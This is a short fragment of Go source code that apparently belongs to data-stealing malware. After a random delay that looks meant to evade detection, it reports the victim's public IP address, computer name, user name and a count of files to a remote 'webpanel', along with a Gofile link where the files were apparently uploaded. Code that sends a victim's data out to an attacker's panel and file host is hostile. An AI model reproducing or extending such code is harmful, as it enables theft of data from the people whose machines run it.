	if err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		publicIP = string(body)
	}
	
	randomDelay()
	
	// Send notification to webpanel with Gofile link
	sendZipNotificationToWebpanel(
		gofileURL,
		os.Getenv("COMPUTERNAME"),
		os.Getenv("USERNAME"),
		publicIP,
		fileCount,
	)

	os.Exit(0)
}
